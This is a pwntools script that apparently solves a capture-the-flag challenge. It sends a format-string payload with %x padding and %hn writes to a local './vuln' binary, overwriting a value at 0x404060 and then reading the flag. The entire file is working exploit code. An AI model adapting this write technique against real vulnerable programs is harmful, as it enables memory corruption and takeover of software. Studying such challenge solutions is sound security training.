from pwn import *

# Start the process locally
p = process('./vuln')

# Wait until you reach the part where the prompt is printed
p.recvuntil(b"change my suspicions. What do you have to say?")

# Addresses to overwrite
lower_address = 0x404060
higher_address = 0x404062

# Padding calculations
lower_padding = 27742  # (27750 - 8)
higher_padding = 64251  # (26465 + 65536) - 27750

# Construct the payload
payload = b""
payload += b"%27742x"          # Padding for lower order (0x6c66)
payload += b"%20$hn"           # Write lower order (0x6c66)
payload += b"%64251x"          # Padding for higher order (0x6761)
payload += b"%19$hn"           # Write higher order (0x6761)
payload += p64(lower_address)  # Lower order address
payload += p64(higher_address) # Higher order address

# Add the string "IJKLMNOPQRSTVUWXYZ"
payload += b"IJKLMNOPQRSTVUWXYZ"

# Send the payload
p.sendline(payload)

# Get the flag or interact with the process if needed
flag = p.recvall()  # This may be used to capture the flag
print("Flag: ", flag)

